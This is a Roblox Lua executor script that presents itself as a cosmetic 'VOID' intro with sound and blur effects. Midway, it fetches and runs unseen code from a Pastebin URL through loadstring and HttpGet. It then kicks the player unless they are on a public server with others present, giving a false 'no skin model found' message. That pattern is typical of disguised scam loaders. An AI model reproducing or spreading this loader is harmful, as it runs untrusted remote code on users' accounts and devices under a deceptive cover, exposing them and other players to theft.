-- intro music
local sound = Instance.new("Sound")
sound.Parent = game:GetService("SoundService")
sound.SoundId = "rbxassetid://136917641181040" -- you can change this ID
sound.Volume = 3
sound.Looped = false
sound:Play()

-- Define the ScreenGui, Frame, and TextLabel for the intro
local screenGui = Instance.new("ScreenGui")
local frame = Instance.new("Frame")
local textLabel = Instance.new("TextLabel")

-- Parent the GUI elements
screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
frame.Parent = screenGui
textLabel.Parent = frame

-- Set Frame properties to cover the whole screen and apply blur
frame.Size = UDim2.new(1, 0, 1, 0)
frame.BackgroundTransparency = 1
frame.ZIndex = 1

-- Create a BlurEffect
local blurEffect = Instance.new("BlurEffect", game.Lighting)
blurEffect.Size = 24

-- ProperTies
textLabel.Size = UDim2.new(1, 0, 0.2, 0)
textLabel.Position = UDim2.new(0, 0, 0.4, 0)
textLabel.BackgroundTransparency = 1
textLabel.TextScaled = true
textLabel.Text = "VOID"
textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
textLabel.Font = Enum.Font.LuckiestGuy

-- intro animation (pop-in effect)
textLabel.TextTransparency = 1
textLabel.TextStrokeTransparency = 1
textLabel.Size = UDim2.new(1, 0, 0.1, 0)

textLabel:TweenSize(
	UDim2.new(1, 0, 0.2, 0),
	Enum.EasingDirection.Out,
	Enum.EasingStyle.Back,
	0.8,
	true
)

for i = 1, 10 do
	textLabel.TextTransparency -= 0.1
	textLabel.TextStrokeTransparency -= 0.1
	task.wait(0.05)
end

-- Wait
wait(4)

-- Destroy
blurEffect:Destroy()
screenGui:Destroy()

sound:Stop()
sound:Destroy()

-- script
loadstring(game:HttpGet("https://pastebin.com/raw/SuJRpVQX",true))()

local Sound = Instance.new("Sound", game:GetService("SoundService"))
Sound.SoundId = "rbxassetid://134938643932555"
Sound:Play()
game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = ("Thanks for using my script"),
    Text = "void void void sahur",
})
Duration = 60

-- Wait for the game and Delta to stabilize
if not game:IsLoaded() then game.Loaded:Wait() end
task.wait(1) 

local player = game:GetService("Players").LocalPlayer

-- Method 1: Check standard properties
-- Method 2: Check if you are alone (common in private servers)
local isPrivate = (game.PrivateServerId ~= "" or game.PrivateServerOwnerId ~= 0)
local isAlone = (#game:GetService("Players"):GetPlayers() <= 1)

if isPrivate or isAlone then
    player:Kick("no skin model found. use it on public server to work.")
else
    print("Public server detected. Script authorized.")
end